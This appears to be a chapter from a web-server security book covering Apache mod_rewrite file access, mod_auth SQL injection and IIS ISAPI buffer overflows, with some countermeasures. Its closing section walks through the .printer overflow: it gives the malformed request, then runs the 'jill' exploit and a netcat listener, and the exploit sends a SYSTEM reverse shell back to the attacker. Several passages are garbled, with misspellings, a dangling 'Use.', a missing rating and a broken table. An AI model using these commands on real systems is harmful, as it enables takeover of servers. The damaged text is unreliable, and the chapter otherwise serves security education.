
# Chapter 3: Hacking Web Servers

## Mod_rewrite File Access

| Popularity | 5 |
| Simplicity | 4 |
| Impact | 9 |
| Risk Rating | 6 |

One of the best resources for an application's security issues is the developer comments and change logs: Use. In September 2000, Apache developers, spearheaded by Tony Finch, released a fix for a vulnerability that would allow a user to access any file on the Web server, even those outside the document root. This module is widely used to return different pages based on a browser's "User-agent" string, cookie information, or parts of a URL (among others).

Unfortunately, it is not easy to identify when a server is using mod_rewrite, or if the configuration is vulnerable. A vulnerable server is a RewriteRule that maps a URL to a local page that is referenced by its complete pathname. A vulnerable rule:

```
RewriteRule /more-icons/* /home/httpd/icons/$1
```

A rule that is not vulnerable:

```
RewriteRule /more-icons/.* /icons/$1
```

## Mod_rewrite Countermeasures

As you may have already guessed from the previous discussion, specify RewriteRules that use generic pathnames.

| Popularity | 6 |
| Simplicity | 7 |

In August 2001, the RUS-CERT from the University of Stuttgart released an advisory that demonstrated how to bypass several SQL-based authentication modules (see the "References and Further Reading" section at the end of this chapter for a link). The mighty tick mark (*) can be inserted into requests. This allows a user to create arbitrary SQL commands, the simplest of which spoof the site’s authentication (we discuss the nature of this vulnerability in more detail in Chapter 5).

## mod_auth_*sql Countermeasures

Upgrade the mod_auth_*sql package that you are using. It is necessary to stop and restart the Apache Web server after updating these packages.

## Apache httpd 2.0

What does the future hold for Apache? The 2.0 series is well into testing and should receive the benefit of developers sooner. One of the biggest changes in version 2.0 is filtering, or the improved ability to chain multiple modules for URL parsing. With the problems that plague modules such as mod_rewrite along several months of development, it’s a good guess that insecure modules or bugs creep into the new hierarchy. Two DoS attacks were discovered—and fixed—late in the development series. DoS attacks are the rudest, most trivial attacks to execute, but web sites want to avoid them whenever possible.

## Microsoft Information Server (IIS)

As one of the most widely deployed web servers on the Internet, Microsoft’s flagship Web server has been a frequent target over the years. It has been plagued by such vulnerabilities as code revelation like :DATA, information exposures via sample scripts like show.asp, piggybacking privileged command execution on back-end database queries (MDAC/RDS), and straightforward buffer overflow exploits (ISHack). Although all of the issues have been patched in the most recent version of IIS (IIS 5 as of this writing), a new crop of exposures seems to arise with regularity. Most serious of the past and current crop of IIS security vulnerabilities can be grouped as:

- Attacks against IIS components
- Attacks against IIS itself

We discuss attacks of each category in this section, as well as countermeasures in a closing discussion on hardening IIS against similar attacks that may arise in the future. You will see, the vast majority of attacks past and present lie in the first category, and we’ll blow the surprise by noting out that anyone who can disable IIS component functionality will have taken a large step towards eliminating future security woes. Keep this concept in mind as you read on.

## Attacks Against IIS Components

IIS relies heavily on a collection of Dynamic Link Libraries (DLLs) that work together with the main server process, inetinfo.exe, to provide various capabilities (server-side script execution, content indexing, Web-based printing, and so on). The functionality embodied in these various DLLs can be invoked simply by requesting a file with the appropriate extension of IIS. For example, requesting a file with the .printer (whether that file actually exists or not) will invoke the DLL to handle Web-based printing.

This architecture, termed the Internet Server Application Programming Interface (ISAPI) by Microsoft, provides extensible interfaces for hackers with a myriad of different functionality to exploit malicious input. They simply need to construct a URL that calls for a specific file, and then provide malformed input to the ISAPI DLL that is invoked by that request. The results of such attacks have proven disastrous for servers IIS over the last few years, and is a primary example of the old security adage that leads to insecurity. Stated another way, the more functionality provided out of the box by your Web server, the greater your exposure to attack. Let's take a look at how ISAPI functionality can be exploited in the real world.

## ISAPI DLL Bufferflows

| Popularity | 10 |
| Simplicity | 9 |
| Impact | 10 |
| Risk Rating | |

One of the most extreme vulnerabilities associated with ISAPI DLLs is the buffer overflow. In Late 2001 and into 2002, IIS servers on the Internet were ravaged by versions of the Code Red and Nimid worms, which were both based on buffer overflow exploits of published ISAPI DLL vulnerabilities. In April 2002, another fairly severe buffer overflow in the Active Server Pages (ASP) ISAPI DLL was announced. We will discuss one example of such a vulnerability in this section.

In May 2001, eDigital Security announced discovery of a buffer overflow within the ISAPI filter that handles .printer files (C:\WINNT\System32\msw3pr.dll) that provides support for the Internet Printing Protocol (IPP). IPP extends the Web-based control of various aspects of networked printers.

The vulnerability arises when a buffer of approximately 420 bytes is sent within the HTTP Header: for a .printer ISAPI request, as shown in the following where [buffer] is approximately 420 characters.

```
GET /NULL.printer HTTP/1.0
Host: [buffer]
```

This simple request causes the buffer overflow and would normally halt IIS; however, Windows 2000 automatically restarts IIS (inetinfo.exe) following such crashes to provide greater resiliency for Web services. This, this exploit produces no visible effects from a remote perspective (unless looped continuously to deny service). While the resiliency feature might keep IIS in the event of random faults, it actually makes compromise of the server relatively inconspicuous.

Several canned exploits of the .printer problem have been posted to many popular security listings. One of the first was jill by dark spirit. Although jill is written in C, compiling it on Windows 2000 is a snap with Cygwin environment. jill exploits the IPP buffer overflow and connects a remote shell back to the attackers. The sheveled shell in the context of SYSTEM account, allowing the attacker to execute any arbitrary command on the victim.

The default Web site on the victim stops if the sheveled isn't able to connect, if it isn't exited gracefully, or if some other error occurs. Attempts to start the Web site on the console then fail, and the machine needs to be rebooted to recover from this condition.

Here's how the exploit works. First, start the listener on attacker's system:

```
C:\nc -vv -l -p 2002
listening on [any] 2002 ...
```

Then, launch the exploit targeted at attacker's listener:

```
C:\jill 192.168.234.252 80 192.168.234.250 200
ii remote .printer overflow.
dark spirit <dsprit@beauh.org> / beauh labs.

connecting...
sent...
you may need to send a carriage on your listener if the shell doesn't appear.
have fun!
```

If everything goes as planned, shortly after the exploit executes, a remote shell is sheveled to the attacker's listener. You might have to strike a carriage return to make the shell appear once the connection has been received—and after each subsequent command—as shown in the ensuing example (again, this occurs on the attacker's system):

```
C:\nc -vv -l -p 2002
listening on [any] 2002 ...nconnect to [192.168.234.250] from MANDAL [192.168.234.222] 1117
[carriage return]
```
